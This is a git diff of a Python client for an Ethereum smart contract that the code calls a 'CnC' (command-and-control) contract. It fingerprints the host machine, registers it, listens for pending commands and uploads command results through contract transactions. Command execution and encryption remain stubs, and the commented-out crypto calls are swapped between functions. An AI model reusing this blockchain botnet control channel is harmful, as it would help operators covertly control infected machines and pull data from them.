@@ -3,14 +3,12 @@ from os.path import join as opj
 from web3 import Web3, HTTPProvider
 
 import Client.OsInteractions as OsInteractions
-from web3.utils.events import get_event_data
-from web3.utils.abi import filter_by_name,abi_to_signature
 from web3.contract import ConciseContract
 from Util.SolidityTypeConversionUtil import *
 from Util.Process import waitFor, kill_proc
 from Util.EtherKeysUtil import *
 from Util.EtherTransaction import *
-
+# import pyelliptic
 
 REGISTRATION_CONFIRMATION_EVENT_NAME = 'InstanceRegistered'
 COMMAND_PENDING_EVENT_NAME = 'CommandPending'
@@ -39,6 +37,8 @@ class ClientCommands:
 
 		# load CnC contract
 		self.contract = self.loadContract()
+
+		self.ownerPubKey = self.contract.ownerPubKey()
 		#TODO: check contract is up, otherwise go to sleep or die
 
 		self.password = conf['clientWalletPassword']
@@ -62,13 +62,12 @@ class ClientCommands:
 		if self.registered():
 			return True
 
-		self.machineId = OsInteractions.fingerprintMachine()
+		machineIdHash = self.web3.sha3(OsInteractions.fingerprintMachine())
 
 		currBlock = self.web3.eth.blockNumber
 		filter = self.web3.eth.filter({'from': self.address, 'fromBlock': currBlock})
 
 		try:
-			machineIdHash = self.web3.sha3(self.machineId)
 			self.contract.registerInstance(machineIdHash, transact={'from': self.address, 'gas': 3000000})
 
 			self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
@@ -96,28 +95,30 @@ class ClientCommands:
 
 
 
-	def getLogData (self, eventName, logs) -> list:
-		#eabi = [m for m in self.abi if m.get('name', '-1') == eventName]
-		eabi = filter_by_name(eventName,self.contractAbi)
-		return [get_event_data(eabi[0],log) for log in logs ] if eabi else []
 
-
-	def waitForWork(self):
-		pass
 
 	def doWork(self, work):
 		#TODO actually execute stuff...
 		return 'Awsome'
 
-	def sendResults(self, workResults):
-		pass
 
-	def decryptMessageFromServer(self, msg):
-		#TODO actual decryption
+	def sendResults(self, cmdId, workResults):
+		l.info("sending results of cmdId",cmdId,"to server. result:",workResults[0:30],'...')
+		machineIdHash = self.web3.sha3 (OsInteractions.fingerprintMachine())
+		sessionAndMachineIdHash = self.web3.sha3(self.sessionId, machineIdHash)
+		#function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
+		self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': 3000000})
+
+	def decryptMessageFromServer(self, msg, encrypt=True):
+		# if encrypt:
+		# 	alice = pyelliptic.ecc()
+		# 	msg = alice.encrypt(msg,self.ownerPubKey)
 		return msg
 
-	def encryptMessageForServer(self, msg):
-		#TODO actual encryption
+	def encryptMessageForServer(self, msg, decrypt = True):
+		# if decrypt:
+		# 	bob = pyelliptic.ecc()
+		# 	bob.decrypt()
 		return msg
 
 
@@ -159,7 +160,7 @@ class ClientCommands:
 						l.info('Command',cmdId, 'execution complete:', workResults)
 
 						workResultsEnc = self.encryptMessageForServer(workResults)
-						self.sendResults(workResultsEnc)
+						self.sendResults(cmdId, workResultsEnc)
 
 					self.commandFilter.watch(onCommandArrival)
 				except Exception as e:
